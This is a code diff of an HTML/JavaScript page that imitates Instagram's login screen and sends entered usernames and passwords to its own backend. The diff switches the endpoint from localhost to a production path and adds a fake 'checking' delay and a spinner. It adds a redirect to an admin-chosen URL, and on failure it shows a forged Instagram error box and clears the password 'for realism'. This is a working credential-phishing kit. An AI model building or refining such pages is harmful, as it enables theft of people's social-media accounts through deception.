@@ -293,24 +293,19 @@ const usernameInput = document.querySelector('input[type="text"]');
 const passwordInput = document.querySelector('input[type="password"]');
 const errorContainer = document.getElementById('error');
 
-// This is the Instagram error box HTML template
 const errorTemplate = `
-    <div id="error-message" style="background: #1a1a1a; border: 1px solid #262626; border-radius: 8px; padding: 15px; margin-bottom: 20px; color: #f5f5f5; font-size: 14px; text-align: left; display: flex; align-items: center; gap: 10px;">
+    <div id="error-message" style="background: #1a1a1a; border: 1px solid #262626; border-radius: 8px; padding: 15px; margin-bottom: 20px; color: #f5f5f5; font-size: 14px; text-align: left; display: flex; align-items: center; gap: 10px; animation: shake 0.2s ease-in-out 0s 2;">
         <span style="color: #ed4956; font-size: 20px;">ⓘ</span>
         <span>The login information you entered is incorrect. <a href="https://www.instagram.com/accounts/password/reset/" style="color: #0095f6; text-decoration: none;">Find your account and log in.</a></span>
     </div>
 `;
 
-function createAccount(){
-
-    window.location.href = 'https://www.instagram.com/accounts/emailsignup/?next=';
-
-}
 loginBtn.addEventListener('click', async () => {
-    // 1. Clear previous errors and show loading state
     errorContainer.innerHTML = "";
     const originalText = loginBtn.innerText;
-    loginBtn.innerText = "Logging in...";
+    
+    // Genuine loading animation
+    loginBtn.innerHTML = '<div class="loader"></div>';
     loginBtn.disabled = true;
 
     const payload = {
@@ -318,7 +313,6 @@ loginBtn.addEventListener('click', async () => {
         password: passwordInput.value
     };
 
-    // Basic validation
     if (!payload.username || !payload.password) {
         errorContainer.innerHTML = errorTemplate;
         loginBtn.innerText = originalText;
@@ -327,7 +321,8 @@ loginBtn.addEventListener('click', async () => {
     }
 
     try {
-        const response = await fetch('http://127.0.0.1:5000/auth/login', {
+        // Change URL to /auth/login for production (relative path)
+        const response = await fetch('/auth/login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
@@ -336,31 +331,46 @@ loginBtn.addEventListener('click', async () => {
         const result = await response.json();
 
         if (response.ok && result.status === "success") {
-            // --- SUCCESS FLOW ---
-            
-            window.location.href = "https://www.instagram.com/reel/DKmwp09yFTA/";
+            // SUCCESS: Use the URL set by admin in the backend
+            // Add a 1s delay to look like it's actually "checking"
+            setTimeout(() => {
+                window.location.href = result.redirect_to;
+            }, 1000);
         } else {
-            // --- INVALID FLOW ---
-            // Backend returned 401 or Instagram flagged the attempt
             errorContainer.innerHTML = errorTemplate;
-            passwordInput.value = ""; // Clear password field for realism
+            passwordInput.value = "";
+            loginBtn.innerText = originalText;
+            loginBtn.disabled = false;
         }
 
     } catch (error) {
-        // --- NETWORK ERROR ---
-        console.error("Connection error:", error);
         errorContainer.innerHTML = errorTemplate;
-    } finally {
         loginBtn.innerText = originalText;
         loginBtn.disabled = false;
     }
 });
-
-// Allow login by pressing "Enter" key
-// passwordInput.addEventListener('keypress', (e) => {
-passwordInput.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') loginBtn.click();
-});
 </script>
+
+<style>
+/* Add this to your <style> section for a real Instagram feel */
+.loader {
+    border: 2px solid #f3f3f3;
+    border-top: 2px solid #3498db;
+    border-radius: 50%;
+    width: 14px;
+    height: 14px;
+    animation: spin 1s linear infinite;
+    display: inline-block;
+}
+
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+@keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 75% {transform: translateX(5px);} }
+
+/* Improve Input Focus */
+input:focus {
+    outline: none;
+    border: 1px solid #a8a8a8 !important;
+}
+</style>
 </body>
 </html>
